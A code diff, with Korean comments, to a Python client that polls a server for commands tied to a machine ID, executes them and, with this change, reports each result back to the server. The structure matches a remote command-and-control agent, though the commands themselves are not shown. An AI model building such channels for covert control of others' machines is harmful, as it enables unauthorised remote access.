@@ -1,4 +1,3 @@
-import os
 import time
 import threading
 import json
@@ -77,22 +76,48 @@ def poll_command():
     while True:
         try:
             r = requests.get(
-                f"{SERVER_URL}api/client/command?machine_id={MACHINE_ID}",
-                timeout=30
+                f"{SERVER_URL}api/client/command",
+                params={"machine_id": MACHINE_ID, "timeout": 30},
+                timeout=35
             )
             if r.status_code == 200:
                 cmd_data = r.json()
                 if cmd_data and cmd_data.get('command_type'):
+                    cmd_id = cmd_data.get('command_id')
                     cmd_type = cmd_data['command_type']
                     cmd_params = json.loads(cmd_data.get('command_data', '{}'))
                     print(f"\n[>>>] 명령 수신: {cmd_type} | 파라미터: {cmd_params}")
+
+                    # 명령 실행
                     result = CommandExecutor.execute_command(cmd_type, cmd_params)
                     print(f"[<<<] 결과: {result}\n")
+
+                    # 결과를 서버로 보고
+                    send_command_result(cmd_id, 'completed', result)
+
         except requests.exceptions.Timeout:
             continue
         except Exception as e:
             print(f"[-] 명령 조회 오류: {e}")
             time.sleep(5)
+
+
+def send_command_result(command_id, status, result):
+    """명령 실행 결과를 서버로 보고"""
+    try:
+        data = {
+            "machine_id": MACHINE_ID,
+            "command_id": command_id,
+            "status": status,
+            "result": result
+        }
+        r = requests.post(f"{SERVER_URL}api/client/command/result", json=data, timeout=5)
+        if r.status_code == 200:
+            print(f"[+] 명령 결과 전송 완료: CMD#{command_id}")
+        else:
+            print(f"[-] 명령 결과 전송 실패: {r.status_code}")
+    except Exception as e:
+        print(f"[-] 명령 결과 전송 오류: {e}")
 
 
 def heartbeat_thread():
